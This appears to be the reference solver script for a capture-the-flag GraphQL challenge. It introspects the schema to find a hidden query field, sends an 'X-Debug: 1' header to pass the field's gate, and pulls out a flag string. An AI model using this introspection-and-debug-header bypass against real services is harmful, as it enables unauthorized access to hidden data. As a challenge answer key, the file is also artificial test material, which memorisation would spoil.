"""Reference solver for graphql: introspect, find the hidden field, satisfy its gate.

    python3 solve.py <host> <port>
"""
import json
import re
import sys
import urllib.request


def gql(base, query, headers=None):
    req = urllib.request.Request(base + "/graphql",
                                 data=json.dumps({"query": query}).encode(),
                                 headers={"Content-Type": "application/json",
                                          **(headers or {})})
    return json.loads(urllib.request.urlopen(req, timeout=15).read())


def main():
    host, port = sys.argv[1], sys.argv[2]
    base = f"http://{host}:{port}"

    # 1. introspect the schema to enumerate every query field
    schema = gql(base, "{ __schema { queryType { fields { name description } } } }")
    fields = schema["data"]["__schema"]["queryType"]["fields"]
    hidden = [f for f in fields if f["name"] not in ("me", "users")]
    target = hidden[0]["name"] if hidden else "secretFlag"

    # 2. the description reveals the gate (an internal debug header)
    probe = gql(base, "{ %s }" % target)
    # 3. satisfy it and query the field
    out = gql(base, "{ %s }" % target, headers={"X-Debug": "1"})
    val = out.get("data", {}).get(target, "")
    m = re.search(r"flag\{[^}]*\}", val)
    print(m.group(0) if m else (val or out))


if __name__ == "__main__":
    main()
